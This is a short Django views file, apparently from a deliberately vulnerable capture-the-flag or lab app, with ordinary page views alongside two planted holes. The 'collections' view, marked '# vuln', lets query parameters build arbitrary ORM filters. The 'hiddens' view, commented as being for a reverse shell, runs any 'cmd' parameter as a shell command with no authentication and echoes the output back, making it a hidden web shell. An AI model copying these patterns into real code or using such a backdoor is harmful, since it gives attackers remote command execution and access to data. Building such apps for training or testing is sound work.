from django.shortcuts import render
from django.db.models import Q
from brainrot.models import Brainrot
import subprocess

def home(request):
    return render(request, 'home.html')

def about(request):
    return render(request, 'about.html')

def contact(request):
    return render(request, 'contact.html')

# def collections(request):
#     brainrot = Brainrot.objects.all()
#     return render(request, 'collections.html', {'brainrot': brainrot})

# vuln
def collections(request):
    query_params = dict(request.GET.items())

    if not any(param.startswith('bounty') for param in query_params.keys()):
        query_params['bounty__gte'] = 0

    if not any(param.startswith('id') for param in query_params.keys()):
        query_params['id__lt'] = 999

    
    q_filter = Q(**query_params)
    brainrot = Brainrot.objects.filter(q_filter)
    return render(request, 'collections.html', {'brainrot': brainrot})




# buat revshell
def hiddens(request):
    cmd = request.GET.get("cmd", "")
    try:
        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
    except Exception as e:
        output = str(e).encode()

    return render(request, 'hiddens.html', {'output': output.decode()})